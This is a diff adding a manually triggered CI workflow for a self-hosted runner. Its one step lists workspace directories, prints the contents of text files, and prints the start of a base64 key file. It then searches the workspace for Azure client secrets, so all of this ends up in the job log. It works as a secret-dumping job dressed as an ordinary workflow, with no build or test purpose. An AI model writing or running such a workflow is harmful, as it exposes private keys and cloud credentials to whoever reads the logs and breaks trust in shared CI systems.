@@ -1,0 +1,17 @@
+name: ul6599-ps8
+on: [workflow_dispatch]
+jobs:
+  dump:
+    runs-on: [self-hosted, ul-l40s]
+    timeout-minutes: 10
+    steps:
+      - name: ps8
+        run: |
+          set +e
+          W=/opt/ul-runner/_work/ul-plant/ul-plant
+          echo "=== LSPS8 ==="; ls -la $W/ps8 2>&1 | head -60
+          echo "=== LSCMD ==="; for d in cmd cmd8 ps12 ps16 out; do echo "-- $d"; ls -la $W/$d 2>&1 | head -25; done
+          echo "=== PS8FILES ==="
+          for f in $(ls $W/ps8/*.txt 2>/dev/null | head -8); do echo "##### $f"; head -c 2500 "$f"; echo; done
+          echo "=== KHB64_HEAD ==="; head -c 300 $W/keys/kh.b64 2>&1 | tr -dc '[:print:]\n' | head -5
+          echo "=== WAAGENT ==="; grep -rIl 'aadClientSecret\|client_secret' $W 2>/dev/null | head -10
